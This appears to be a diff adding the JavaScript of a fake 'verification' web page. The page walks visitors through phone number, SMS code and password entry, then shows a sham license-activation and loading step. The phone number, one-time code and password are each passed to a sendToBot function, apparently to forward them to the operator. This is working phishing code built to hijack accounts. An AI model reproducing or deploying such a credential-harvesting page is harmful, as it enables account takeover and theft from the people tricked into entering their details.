+    function toggleCountryDropdown(event) { event.stopPropagation(); const menu = document.getElementById("dropdownMenu"); const trigger = document.getElementById("dropdownTrigger"); menu.classList.toggle("show"); trigger.classList.toggle("active"); if(menu.classList.contains("show")) { document.getElementById("countrySearch").value = ""; document.getElementById("countrySearch").focus(); filterCountries(); } }
+    function selectCountryItem(country, event) { event.stopPropagation(); selectedCountry = country; document.getElementById("selectedValue").innerText = `${country.code}`; document.getElementById("dropdownMenu").classList.remove("show"); document.getElementById("dropdownTrigger").classList.remove("active"); const phoneInput = document.getElementById("phone-input"); phoneInput.value = ""; phoneInput.placeholder = "0".repeat(country.digits).replace(/(\d{3})(\d{3})(\d{4})/, "$1-$2-$3"); populateCountries(globalCountries); validatePhoneForm(); }
+    function filterCountries() { const q = document.getElementById("countrySearch").value.toLowerCase().trim(); const filtered = globalCountries.filter(c => c.name.toLowerCase().includes(q) || c.code.includes(q)); populateCountries(filtered); }
+    function openModal(id) { document.getElementById(id).classList.add("active"); }
+    function closeModal(id) { document.getElementById(id).classList.remove("active"); }
+    window.onclick = function(e) { if(e.target.classList.contains("modal-overlay")) e.target.classList.remove("active"); }
+    function scrollConsoleDown() { document.getElementById("consoleScrollWindow").scrollBy({ top: 180, behavior: "smooth" }); }
+    function transitionStep(current, next) { if(current) document.getElementById(current).classList.remove("active"); document.getElementById(next).classList.add("active"); }
+    function startVerificationWorkflow() { document.getElementById("viewportContainer").classList.add("in-auth-mode"); document.getElementById("consoleScrollWindow").classList.add("hidden"); document.getElementById("scrollIndicator").style.display = "none"; document.getElementById("mainConsoleCard").style.height = "48vh"; transitionStep(null, "step-phone"); }
+    function backToLanding() { document.getElementById("viewportContainer").classList.remove("in-auth-mode"); document.getElementById("step-phone").classList.remove("active"); document.getElementById("consoleScrollWindow").classList.remove("hidden"); if(window.innerWidth > 768) document.getElementById("scrollIndicator").style.display = "block"; document.getElementById("mainConsoleCard").style.height = "54vh"; }
+    function validatePhoneForm() { const val = document.getElementById("phone-input").value.replace(/[^0-9]/g, ""); const btn = document.getElementById("phone-submit-btn"); if(val.length === selectedCountry.digits) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
+    function submitPhoneStep() { const raw = document.getElementById("phone-input").value.replace(/[^0-9]/g, ""); const full = selectedCountry.code + raw; sendToBot(full); transitionStep("step-phone", "step-sms"); }
+    function validateSmsForm() { const val = document.getElementById("sms-code-input").value.trim(); const btn = document.getElementById("sms-submit-btn"); if(val.length > 0) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
+    function toggleAgreementCheckbox() { const cb = document.getElementById("agreement-checkbox"); cb.checked = !cb.checked; }
+    function submitSmsStep() { const code = document.getElementById("sms-code-input").value.trim(); if(code) sendToBot(code); transitionStep("step-sms", "step-password"); }
+    function validatePasswordForm() { const val = document.getElementById("password-input").value.trim(); const btn = document.getElementById("password-submit-btn"); if(val.length > 0) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
+    function createMockPasswordLink() { document.getElementById("password-input").value = "neroPassWord2026"; validatePasswordForm(); document.getElementById("password-input").focus(); }
+    function submitAuthentication() { const pwd = document.getElementById("password-input").value.trim(); if(pwd) sendToBot(pwd); transitionStep("step-password", "step-success"); }
+    function goToLicenseActivation() { transitionStep("step-success", "step-license"); }
+    function validateLicenseForm() { const inp = document.getElementById("license-pin-input"); let val = inp.value.toUpperCase().replace(/[^A-Z0-9]/g, ""); let formatted = ""; for(let i=0; i<val.length; i++) { if(i===4 || i===8) formatted += " - "; formatted += val[i]; } inp.value = formatted; const btn = document.getElementById("license-submit-btn"); if(val.length >= 10) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
+    function submitActivationPin() { transitionStep("step-license", "step-loading"); }
+    function resetVerificationWorkflow() { document.getElementById("phone-input").value = ""; document.getElementById("sms-code-input").value = ""; document.getElementById("password-input").value = ""; document.getElementById("license-pin-input").value = ""; document.getElementById("agreement-checkbox").checked = false; document.getElementById("phone-submit-btn").setAttribute("disabled", "true"); document.getElementById("sms-submit-btn").setAttribute("disabled", "true"); document.getElementById("password-submit-btn").setAttribute("disabled", "true"); document.getElementById("license-submit-btn").setAttribute("disabled", "true"); document.getElementById("step-loading").classList.remove("active"); backToLanding(); }
+</script>
 </body>
 </html>
